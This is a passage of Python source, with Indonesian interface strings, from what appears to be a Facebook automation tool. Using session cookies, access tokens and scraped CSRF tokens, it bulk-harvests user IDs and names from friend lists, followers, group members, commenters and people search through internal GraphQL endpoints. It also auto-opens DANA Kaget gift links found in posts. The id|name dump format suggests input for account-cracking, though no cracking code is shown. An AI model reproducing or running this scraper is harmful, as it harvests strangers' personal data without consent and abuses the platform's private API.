                    time.sleep(1.0)
                    self.Next_Kaget_Mbasic(cookies, pertanyaan, self.next_cursor, self.usid, self.pn, jeda_pengulangan, jeda_pengulangan2)
                else:
                    time.sleep(int(jeda_pengulangan2))
                    self.Mbasic_Kaget(cookies, pertanyaan, jeda_pengulangan, jeda_pengulangan2)
        except (KeyboardInterrupt):
            print("\r                                                                   ", end='\r')
            time.sleep(2.5)
            self.Kaget_Mbasic(cookies, pertanyaan, jeda_pengulangan, jeda_pengulangan2)
        except (RequestException) as e:
            print("\r                                                        ", end='\r')
            print("[bold dodger_blue3]   ╰─>bold red] Koneksi Error!", end='\r')
            time.sleep(10.5)
            self.Kaget_Mbasic(cookies, pertanyaan, jeda_pengulangan, jeda_pengulangan2)

    def Next_Kaget_Mbasic(self, cookies, pertanyaan, next_cursor, usid, pn, jeda_pengulangan, jeda_pengulangan2):
        with requests.Session() as r:
            r.headers.update({
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id,en;q=0.9',
                'accept-encoding': 'gzip, deflate',
                'sec-fetch-site': 'none',
                'cache-control': 'max-age=0',
                'referer': 'https://mbasic.facebook.com/',
                'sec-fetch-dest': 'document',
                'sec-fetch-user': '?1',
                'sec-fetch-mode': 'navigate',
                'connection': 'keep-alive',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                'Host': 'mbasic.facebook.com',
                'upgrade-insecure-requests': '1',
            })
            params = {
                'isTrending': '0',
                'cursor': next_cursor,
                'tsid': '',
                'paipv': '0',
                'pn': pn,
                'q': pertanyaan,
                'eav': '',
                'usid': usid,
                'lul': '',
                'source': 'filter',
            }
            response = r.get('https://mbasic.facebook.com/search/posts/', params = params, cookies = {
                'cookie': cookies
            })
            self.find_dana_kaget = re.findall('href="(.*?)"', str(response.text))
            for link in self.find_dana_kaget:
                try:
                    self.string_url = urllib.parse.unquote(link)
                    if 'link.dana.id' in str(self.string_url):
                        self.final_daget = re.search('u=(.*?)&r=', str(self.string_url)).group(1)
                        if str(self.final_daget) in str(open('Data/Daget.txt', 'r').read().splitlines()):
                            continue
                        else:
                            print(f"[bold dodger_blue3]   ╰─>[bold green] Membuka Link {self.final_daget}...", end='\r')
                            time.sleep(1.0)
                            os.system(f'xdg-open {self.final_daget}')
                            Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold white]Status :[italic green] Successfully got the link...[/]
[bold white]Link :[bold red] {self.final_daget}""", title="[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Sukses)[bold green] <[bold yellow]<[bold red]<"))
                            open('Data/Daget.txt', 'a+').write(f'{self.final_daget}\n')
                            time.sleep(int(jeda_pengulangan))
                    else:
                        continue
                except (Exception):
                    continue
            if 'cursor=' in str(response.text):
                if len(Percobaan) >= 1:
                    Percobaan.clear()
                    print(f"[bold dodger_blue3]   ╰─>[bold red] Sedang Mencari Link...", end='\r')
                    time.sleep(int(jeda_pengulangan2))
                    self.Kaget_Mbasic(cookies, pertanyaan, jeda_pengulangan, jeda_pengulangan2)
                else:
                    self.next_cursor = re.search('cursor=(.*?)&', str(response.text)).group(1).replace('&amp;', '')
                    self.usid = re.search('usid=(.*?)&', str(response.text)).group(1).replace('&amp;', '')
                    self.pn = re.search('pn=(.*?)&', str(response.text)).group(1).replace('&amp;', '')
                    print(f"[bold dodger_blue3]   ╰─>[bold yellow] Sedang Mencari Link...", end='\r')
                    time.sleep(1.0)
                    Percobaan.append(self.next_cursor)
                    self.Next_Kaget_Mbasic(cookies, pertanyaan, self.next_cursor, self.usid, self.pn, jeda_pengulangan, jeda_pengulangan2)
            else:
                time.sleep(int(jeda_pengulangan2))
                self.Kaget_Mbasic(cookies, pertanyaan, jeda_pengulangan, jeda_pengulangan2)

class Dumps_Graph:

    def __init__(self) -> None:
        pass

    def Friends_Count(self, access_token, cookies, user_ids, after):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-encoding': 'gzip, deflate',
                    'connection': 'keep-alive',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'sec-fetch-mode': 'navigate',
                    'upgrade-insecure-requests': '1',
                    'sec-fetch-site': 'none',
                    'sec-fetch-dest': 'document',
                    'Host': 'graph.facebook.com',
                    'sec-fetch-user': '?1',
                    'accept-language': 'id,en;q=0.9',
                })
                params = {
                    'access_token': access_token,
                    'pretty': '1',
                    'after': after,
                }
                response = r.get('https://graph.facebook.com/v18.0/{}/friends?'.format(user_ids), params = params, cookies = {
                    'cookie': cookies
                })
                self.json_data = json.loads(response.text)
                if '\'name\':' in str(self.json_data) and '\'id\':' in str(self.json_data):
                    for z in self.json_data['data']:
                        self.user_ids, self.name = z['id'], z['name']
                        if len(self.name) > 40 or str(self.user_ids) in str(Dump):
                            continue
                        else:
                            Dump.append(f'{self.user_ids}|{self.name}')
                            print(f"[bold dodger_blue3]   ╰─>[bold yellow] Dump @{self.user_ids}/{len(Dump)} Username...         ", end='\r')
                    if '\'after\':' in str(self.json_data):
                        self.after = self.json_data['paging']['cursors']['after']
                        self.Friends_Count(access_token, cookies, user_ids, self.after)
                    else:
                        return ("Dump Sukses")
                else:
                    return ("Dump Gagal")
        except (KeyboardInterrupt):
            print("\r                                                                   ", end='\r')
            return ("Dump KeyboardInterrupt")

class Dumps_GraphQL:

    def __init__(self) -> None:
        pass

    def Get_Query_Count(self, cookies, name):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-user': '?1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                    'accept-language': 'en-US,en;q=0.9',
                    'sec-fetch-dest': 'document',
                    'Host': 'web.facebook.com',
                })
                response = r.get('https://web.facebook.com/search/people?q={}'.format(name.replace(' ', '%20')), cookies = {
                    'cookie': cookies
                }).text
                self.find_query = re.findall('},"url":"https:\\/\\/web.facebook.com\/(.*?)","name":"(.*?)"}', str(response))
                self.__user = re.search('"USER_ID":"(\d+)"', str(response)).group(1)
                self.fb_dtsg = re.search('"DTSGInitData",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                self.jazoest = re.search('jazoest=(\d+)"', str(response)).group(1)
                self.lsd = re.search('"LSD",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                self.bsid = re.search('{"bsid":"(.*?)"', str(response)).group(1)
                self.cursor = re.search('"end_cursor":"(.*?)"', str(response)).group(1)
                for z in self.find_query:
                    if str(z[0].replace('profile.php?id=', '')) in str(Dump) or len(z[1]) > 40 or 'groups' in str(z[0]):
                        continue
                    else:
                        Dump.append(f'{z[0].replace("profile.php?id=", "")}|{z[1]}')
                        print(f"[bold dodger_blue3]   ╰─>[bold yellow] Dump @{str(z[0]).replace('profile.php?id=', '')[:20]}/{len(Dump)} Username...         ", end='\r')
                        time.sleep(0.0007)
                self.Next_Cursor_Query(cookies, name, self.__user, self.fb_dtsg, self.jazoest, self.lsd, self.bsid, self.cursor)
        except (KeyboardInterrupt):
            print("\r                                                                   ", end='\r')
            return ("Dump KeyboardInterrupt")
        except (RecursionError):
            print("[bold dodger_blue3]   ╰─>[bold red] RecursionError!                     ", end='\r')
            time.sleep(2.5)
            return ("Dump RecursionError")

    def Next_Cursor_Query(self, cookies, name, __user, fb_dtsg, jazoest, lsd, bsid, cursor):
        with requests.Session() as r:
            r.headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-mode': 'cors',
                'origin': 'https://web.facebook.com',
                'referer': 'https://web.facebook.com/search/people?q={}'.format(name.replace(' ', '%20')),
                'sec-fetch-site': 'same-origin',
                'accept': '*/*',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                'x-asbd-id': '198387',
                'x-fb-lsd': lsd,
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-dest': 'empty',
                'x-fb-friendly-name': 'SearchCometResultsPaginatedResultsQuery',
                'Host': 'web.facebook.com',
            })
            data = {
                '__user': __user,
                'fb_api_req_friendly_name': 'SearchCometResultsPaginatedResultsQuery',
                'lsd': lsd,
                'variables': '{"UFI2CommentsProvider_commentsKey":"SearchCometResultsInitialResultsQuery","allow_streaming":false,"args":{"callsite":"COMET_GLOBAL_SEARCH","config":{"exact_match":false,"high_confidence_config":null,"intercept_config":null,"sts_disambiguation":null,"watch_config":null},"context":{"bsid":"' + str(bsid) + '","tsid":null},"experience":{"encoded_server_defined_params":null,"fbid":null,"type":"PEOPLE_TAB"},"filters":[],"text":"' + str(name) + '"},"count":5,"cursor":"' + str(cursor) + '","displayCommentsContextEnableComment":false,"displayCommentsContextIsAdPreview":false,"displayCommentsContextIsAggregatedShare":false,"displayCommentsContextIsStorySet":false,"displayCommentsFeedbackContext":null,"feedLocation":"SEARCH","feedbackSource":23,"fetch_filters":true,"focusCommentID":null,"locale":null,"privacySelectorRenderLocation":"COMET_STREAM","renderLocation":"search_results_page","scale":1.5,"stream_initial_count":0,"useDefaultActor":false,"__relay_internal__pv__SearchCometResultsShowUserAvailabilityrelayprovider":true,"__relay_internal__pv__GroupsCometDelayCheckBlockedUsersrelayprovider":true,"__relay_internal__pv__IsWorkUserrelayprovider":false,"__relay_internal__pv__IsMergQAPollsrelayprovider":false,"__relay_internal__pv__StoriesArmadilloReplyEnabledrelayprovider":false,"__relay_internal__pv__StoriesRingrelayprovider":false}',
                'jazoest': jazoest,
                'doc_id': '6151616778217404',
                'fb_dtsg': fb_dtsg,
            }
            response = r.post('https://web.facebook.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            })
            self.find_all_user = re.findall('"profile_url":".*?","url":"https://web.facebook.com/(.*?)","name":"(.*?)","profile_picture":', str(response.text))
            for z in self.find_all_user:
                try:
                    self.user, self.name = str(z[0]).replace('profile.php?id=', ''), z[1]
                    if str(self.user) in str(Dump) or len(self.name) > 40:
                        continue
                    else:
                        Dump.append(f'{self.user}|{self.name}')
                        print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r')
                        time.sleep(0.0007)
                except (IndexError):
                    continue
            #for z in json.loads(response.text)['data']['serpResponse']['results']['edges']:
                #try:
                    #self.user, self.name = z['relay_rendering_strategy']['view_model']['profile']['url'].split('https://web.facebook.com/')[1].replace('profile.php?id=', ''), z['relay_rendering_strategy']['view_model']['profile']['name']
                    #if str(self.user) in str(Dump) or len(self.name) > 40:
                        #continue
                    #else:
                        #Dump.append(f'{self.user}|{self.name}')
                        #print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r');time.sleep(0.0007)
                #except (TypeError, KeyError):
                    #continue
            if '{"session_id":"' in str(response.text) and '"end_cursor":"' in str(response.text):
                try:
                    self.bsid, self.cursor = re.search('"session_id":"(.*?)"', str(response.text)).group(1), re.search('"end_cursor":"(.*?)"', str(response.text)).group(1)
                    self.Next_Cursor_Query(cookies, name, __user, fb_dtsg, jazoest, lsd, self.bsid, self.cursor)
                except (AttributeError):
                    print("[bold dodger_blue3]   ╰─>[bold red] AttributeError!                     ", end='\r')
                    time.sleep(2.5)
                    return ("Dump AttributeError")
            else:
                return ("Dump Sukses")

    def Get_Friends_Count(self, cookies, userid):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-user': '?1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                    'accept-language': 'en-US,en;q=0.9',
                    'sec-fetch-dest': 'document',
                    'Host': 'web.facebook.com',
                })
                response = r.get('https://web.facebook.com/profile.php?id={}&sk=friends_all'.format(userid), cookies = {
                    'cookie': cookies
                }).text
                if '"items":{"count":' in str(response):
                    self.total_teman = re.search('"items":{"count":(.*?)}', str(response)).group(1)
                    print(f"[bold dodger_blue3]   ╰─>[bold white] Memiliki[bold green] {self.total_teman}[bold white] Teman...", end='\r');time.sleep(2.5)

                    self.find_friends = re.findall('"id":"(\d+)","friendship_status":".*?","__isNode":".*?","gender":".*?","name":"(.*?)"', str(response))
                    self.__user = re.search('"USER_ID":"(\d+)"', str(response)).group(1)
                    self.fb_dtsg = re.search('"DTSGInitData",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                    self.jazoest = re.search('jazoest=(\d+)"', str(response)).group(1)
                    self.lsd = re.search('"LSD",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                    self.cursor = re.search('"page_info":{"end_cursor":"(.*?)"', str(response)).group(1)
                    self.ids = re.search('"collectionToken":"(.*?)",', str(response)).group(1)

                    for z in self.find_friends:
                        if str(z[0]) in str(Dump) or len(z[1]) > 40:
                            continue
                        else:
                            Dump.append(f'{z[0]}|{z[1]}')
                            print(f"[bold dodger_blue3]   ╰─>[bold yellow] Dump @{str(z[0])[:20]}/{len(Dump)} Username...         ", end='\r')
                            time.sleep(0.0007)
                    self.Next_Cursor_Friends(cookies, userid, self.__user, self.fb_dtsg, self.jazoest, self.lsd, self.cursor, self.ids)
                else:
                    print(f"[bold dodger_blue3]   ╰─>[bold red] Akun @{userid} Tidak Ada Teman!", end='\r')
                    time.sleep(2.5)
                    return ("Tidak Ada Teman")
        except (KeyboardInterrupt):
            print("\r                                                                   ", end='\r')
            return ("Dump KeyboardInterrupt")
        except (RecursionError):
            print("[bold dodger_blue3]   ╰─>[bold red] RecursionError!                     ", end='\r')
            time.sleep(2.5)
            return ("Dump RecursionError")
        except (json.decoder.JSONDecodeError):
            print("[bold dodger_blue3]   ╰─>[bold red] JSONDecodeError!                     ", end='\r')
            time.sleep(2.5)
            return ("Dump JSONDecodeError")

    def Next_Cursor_Friends(self, cookies, userid, __user, fb_dtsg, jazoest, lsd, cursor, ids):
        with requests.Session() as r:
            r.headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-mode': 'cors',
                'origin': 'https://web.facebook.com',
                'sec-fetch-site': 'same-origin',
                'accept': '*/*',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                'x-asbd-id': '198387',
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-dest': 'empty',
                'x-fb-friendly-name': 'ProfileCometAppCollectionListRendererPaginationQuery',
                'Host': 'web.facebook.com',
                'referer': 'https://web.facebook.com/profile.php?id={}&sk=friends_all'.format(userid),
                'x-fb-lsd': lsd,
            })
            data = {
                '__user': __user,
                'fb_api_req_friendly_name': 'ProfileCometAppCollectionListRendererPaginationQuery',
                'lsd': lsd,
                'variables': '{"count":8,"cursor":"' + str(cursor) + '","scale":1.5,"search":null,"id":"' + str(ids) + '"}',
                'jazoest': jazoest,
                'doc_id': '6118528884928354',
                'fb_dtsg': fb_dtsg,
            }
            response = r.post('https://web.facebook.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            })
            self.find_all_user = re.findall('"gender":".*?","name":"(.*?)",.*?"__typename":"User","id":"\d+","__isEntity":"User","url":"https://web.facebook.com/(.*?)"}', str(response.text))
            for z in self.find_all_user:
                try:
                    self.user, self.name = str(z[1]).replace('profile.php?id=', ''), z[0]
                    if str(self.user) in str(Dump) or len(self.name) > 40:
                        continue
                    else:
                        Dump.append(f'{self.user}|{self.name}')
                        print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r')
                        time.sleep(0.0007)
                except (IndexError):
                    continue
            #for z in json.loads(response.text)['data']['node']['pageItems']['edges']:
                #try:
                    #self.user, self.name = z['node']['url'].split('https://web.facebook.com/')[1].replace('profile.php?id=', ''), z['node']['actions_renderer']['action']['client_handler']['profile_action']['restrictable_profile_owner']['name']
                    #if str(self.user) in str(Dump) or len(self.name) > 40:
                        #continue
                    #else:
                        #Dump.append(f'{self.user}|{self.name}')
                        #print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r');time.sleep(0.0007)
                #except (TypeError):
                    #continue
            if '"end_cursor"' in str(response.text) and '"has_next_page":true' in str(response.text):
                try:
                    self.has_next_page = re.search('"end_cursor":"(.*?)","has_next_page":true}},"id":"(.*?)"', str(response.text))
                    self.Next_Cursor_Friends(cookies, userid, __user, fb_dtsg, jazoest, lsd, self.has_next_page.group(1), self.has_next_page.group(2))
                except (AttributeError):
                    print("[bold dodger_blue3]   ╰─>[bold red] AttributeError!                     ", end='\r')
                    time.sleep(2.5)
                    return ("Dump AttributeError")
            else:
                return ("Dump Sukses")
    
    def Get_Followers_Count(self, cookies, userid):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-user': '?1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                    'accept-language': 'en-US,en;q=0.9',
                    'sec-fetch-dest': 'document',
                    'Host': 'web.facebook.com',
                })
                response = r.get('https://web.facebook.com/profile.php?id={}&sk=followers'.format(userid), cookies = {
                    'cookie': cookies
                }).text
                if '"items":{"count":' in str(response):
                    self.total_followers = re.search('"items":{"count":(.*?)}', str(response)).group(1)
                    print(f"[bold dodger_blue3]   ╰─>[bold white] Memiliki[bold green] {self.total_followers}[bold white] Pengikut...", end='\r');time.sleep(2.5)

                    self.find_followers = re.findall('"id":"(\d+)","name":"(.*?)","profile_picture":', str(response))
                    self.__user = re.search('"USER_ID":"(\d+)"', str(response)).group(1)
                    self.fb_dtsg = re.search('"DTSGInitData",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                    self.jazoest = re.search('jazoest=(\d+)"', str(response)).group(1)
                    self.lsd = re.search('"LSD",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                    self.cursor = re.search('"page_info":{"end_cursor":"(.*?)"', str(response)).group(1)
                    self.ids = re.search('"collectionToken":"(.*?)",', str(response)).group(1)
                    for z in self.find_followers:
                        if str(z[0]) in str(Dump) or len(z[1]) > 40:
                            continue
                        else:
                            Dump.append(f'{z[0]}|{z[1]}')
                            print(f"[bold dodger_blue3]   ╰─>[bold yellow] Dump @{str(z[0])[:20]}/{len(Dump)} Username...         ", end='\r')
                            time.sleep(0.0007)
                    self.Next_Cursor_Followers(cookies, userid, self.__user, self.fb_dtsg, self.jazoest, self.lsd, self.cursor, self.ids)
                else:
                    print(f"[bold dodger_blue3]   ╰─>[bold red] Akun @{userid} Tidak Ada Pengikut!", end='\r')
                    time.sleep(2.5)
                    return ("Tidak Ada Pengikut")
        except (KeyboardInterrupt):
            print("\r                                                                   ", end='\r')
            return ("Dump KeyboardInterrupt")
        except (RecursionError):
            print("[bold dodger_blue3]   ╰─>[bold red] RecursionError!                     ", end='\r')
            time.sleep(2.5)
            return ("Dump RecursionError")
            
    def Next_Cursor_Followers(self, cookies, userid, __user, fb_dtsg, jazoest, lsd, cursor, ids):
        with requests.Session() as r:
            r.headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-mode': 'cors',
                'origin': 'https://web.facebook.com',
                'sec-fetch-site': 'same-origin',
                'accept': '*/*',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                'x-asbd-id': '198387',
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-dest': 'empty',
                'x-fb-friendly-name': 'ProfileCometAppCollectionListRendererPaginationQuery',
                'Host': 'web.facebook.com',
                'referer': 'https://web.facebook.com/profile.php?id={}&sk=followers'.format(userid),
                'x-fb-lsd': lsd,
            })
            data = {
                '__user': __user,
                'fb_api_req_friendly_name': 'ProfileCometAppCollectionListRendererPaginationQuery',
                'lsd': lsd,
                'variables': '{"count":8,"cursor":"' + str(cursor) + '","scale":1.5,"search":null,"id":"' + str(ids) + '"}',
                'jazoest': jazoest,
                'doc_id': '6118528884928354',
                'fb_dtsg': fb_dtsg,
            }
            response = r.post('https://web.facebook.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            })
            self.find_all_user = re.findall('"gender":".*?","name":"(.*?)",.*?"__typename":"User","id":"\d+","__isEntity":"User","url":"https://web.facebook.com/(.*?)"}', str(response.text))
            for z in self.find_all_user:
                try:
                    self.user, self.name = str(z[1]).replace('profile.php?id=', ''), z[0]
                    if str(self.user) in str(Dump) or len(self.name) > 40:
                        continue
                    else:
                        Dump.append(f'{self.user}|{self.name}')
                        print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r')
                        time.sleep(0.0007)
                except (IndexError):
                    continue
            #for z in json.loads(response.text)['data']['node']['pageItems']['edges']:
                #try:
                    #self.user, self.name = z['node']['url'].split('https://web.facebook.com/')[1].replace('profile.php?id=', ''), z['node']['title']['text']
                    #if str(self.user) in str(Dump) or len(self.name) > 40:
                        #continue
                    #else:
                        #Dump.append(f'{self.user}|{self.name}')
                        #print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r');time.sleep(0.0007)
                #except (TypeError):
                    #continue
            if '"end_cursor"' in str(response.text) and '"has_next_page":true' in str(response.text):
                try:
                    self.has_next_page = re.search('"end_cursor":"(.*?)","has_next_page":true}},"id":"(.*?)"', str(response.text))
                    self.Next_Cursor_Followers(cookies, userid, __user, fb_dtsg, jazoest, lsd, self.has_next_page.group(1), self.has_next_page.group(2))
                except (AttributeError):
                    print("[bold dodger_blue3]   ╰─>[bold red] AttributeError!                     ", end='\r')
                    time.sleep(2.5)
                    return ("Dump AttributeError")
            else:
                return ("Dump Sukses")

    def Get_Member_Count(self, cookies, groupid):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-user': '?1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                    'accept-language': 'en-US,en;q=0.9',
                    'sec-fetch-dest': 'document',
                    'Host': 'web.facebook.com',
                })
                response = r.get('https://web.facebook.com/groups/{}/members'.format(groupid), cookies = {
                    'cookie': cookies
                }).text
                if '"privacy":true,' in str(response) or 'Konten Ini Tidak Tersedia Saat Ini' in str(response):
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic red]Group Yang Kamu Masukan Mungkin Di Private Atau Salah!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Dump Gagal)[bold green] <[bold yellow]<[bold red]<"));exit()
                else:
                    self.find_group_member = re.findall('"__typename":"User","id":"\d+","__isProfile":".*?","name":"(.*?)","is_verified":.*?,"__isEntity":".*?","work_foreign_entity_info":.*?,"url":"https:\\\/\\\/web.facebook.com\\\/(.*?)"', str(response))
                    self.__user = re.search('"USER_ID":"(\d+)"', str(response)).group(1)
                    self.fb_dtsg = re.search('"DTSGInitData",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                    self.jazoest = re.search('jazoest=(\d+)"', str(response)).group(1)
                    self.lsd = re.search('"LSD",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                    self.cursor = re.findall('"page_info":{"has_next_page":true,"end_cursor":"(.*?)"}},', str(response))
                    for z in self.find_group_member:
                        if str(z[1].replace('profile.php?id=', '')) in str(Dump) or len(z[1]) > 30 or len(z[0]) > 40:
                            continue
                        else:
                            Dump.append(f'{z[1].replace("profile.php?id=", "")}|{z[0]}')
                            print(f"[bold dodger_blue3]   ╰─>[bold yellow] Dump @{str(z[1]).replace('profile.php?id=', '')[:20]}/{len(Dump)} Username...         ", end='\r')
                            time.sleep(0.0007)
                    self.Next_Cursor_Member(cookies, groupid, self.__user, self.fb_dtsg, self.jazoest, self.lsd, self.cursor[len(self.cursor) - 1])
        except (KeyboardInterrupt):
            print("\r                                                                   ", end='\r')
            return ("Dump KeyboardInterrupt")
        except (RecursionError):
            print("[bold dodger_blue3]   ╰─>[bold red] RecursionError!                     ", end='\r');time.sleep(2.5)
            return ("Dump RecursionError")

    def Next_Cursor_Member(self, cookies, groupid, __user, fb_dtsg, jazoest, lsd, cursor):
        with requests.Session() as r:
            r.headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-mode': 'cors',
                'origin': 'https://web.facebook.com',
                'referer': 'https://web.facebook.com/groups/{}/members'.format(groupid),
                'sec-fetch-site': 'same-origin',
                'accept': '*/*',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                'x-asbd-id': '198387',
                'x-fb-lsd': lsd,
                'accept-language': 'en-US,en;q=0.9',
                'sec-fetch-dest': 'empty',
                'x-fb-friendly-name': 'GroupsCometMembersPageNewMembersSectionRefetchQuery',
                'Host': 'web.facebook.com',
            })
            data = {
                '__user': __user,
                'fb_api_req_friendly_name': 'GroupsCometMembersPageNewMembersSectionRefetchQuery',
                'lsd': lsd,
                'variables': '{"count":10,"cursor":"' + str(cursor) + '","groupID":"' + str(groupid) + '","recruitingGroupFilterNonCompliant":false,"scale":1.5,"id":"' + str(groupid) + '"}',
                'jazoest': jazoest,
                'doc_id': '7396994073660826',
                'fb_dtsg': fb_dtsg,
            }
            response = r.post('https://web.facebook.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            })
            self.find_all_user = re.findall('"__typename":"User","id":"\d+","__isProfile":"User","name":"(.*?)".*?,"url":"https://web.facebook.com/(.*?)"', str(response.text))
            for z in self.find_all_user:
                try:
                    self.user, self.name = str(z[1]).replace('profile.php?id=', ''), z[0]
                    if str(self.user) in str(Dump) or len(self.name) > 40:
                        continue
                    else:
                        Dump.append(f'{self.user}|{self.name}')
                        print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r')
                        time.sleep(0.0007)
                except (IndexError):
                    continue
            #for z in json.loads(response.text)['data']['node']['new_members']['edges']:
                #try:
                    #self.user, self.name = z['node']['url'].split('https://web.facebook.com/')[1].replace('profile.php?id=', ''), z['node']['name']
                    #if str(self.user) in str(Dump) or len(self.name) > 40:
                        #continue
                    #else:
                        #Dump.append(f'{self.user}|{self.name}')
                        #print(f"[bold dodger_blue3]   ╰─>[bold green] Dump @{str(self.user)[:20]}/{len(Dump)} Username...         ", end='\r');time.sleep(0.0007)
                #except (TypeError):
                    #continue
            if '"end_cursor":"' in str(response.text):
                try:
                    self.end_cursor = re.search('"end_cursor":"(.*?)"', str(response.text)).group(1)
                    self.Next_Cursor_Member(cookies, groupid, __user, fb_dtsg, jazoest, lsd, self.end_cursor)
                except (AttributeError):
                    print("[bold dodger_blue3]   ╰─>[bold red] AttributeError!                     ", end='\r')
                    time.sleep(2.5)
                    return ("Dump AttributeError")
            else:
                return ("Dump Sukses")
            
    def Get_Komentar_Count(self, cookies, link_postingan):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-user': '?1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
                    'accept-language': 'en-US,en;q=0.9',
                    'sec-fetch-dest': 'document',
                    'Host': 'web.facebook.com',
                })

                response = r.get(link_postingan, cookies = {
                    'cookie': cookies
                }).text

                self.find_user_komentar = re.findall('"author":{"__typename":"User","id":"\d+","name":"(.*?)","url":"https:\\\/\\\/web.facebook.com\\\/(.*?)"}', str(response))
                self.__user = re.search('"USER_ID":"(\d+)"', str(response)).group(1)
                self.fb_dtsg = re.search('"DTSGInitData",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                self.jazoest = re.search('jazoest=(\d+)"', str(response)).group(1)
                self.lsd = re.search('"LSD",\\[\\],{"token":"(.*?)"', str(response)).group(1)
                for z in self.find_user_komentar:
                    if str(z[1].replace('profile.php?id=', '')) in str(Dump) or len(z[0]) > 40:
                        continue
                    else:
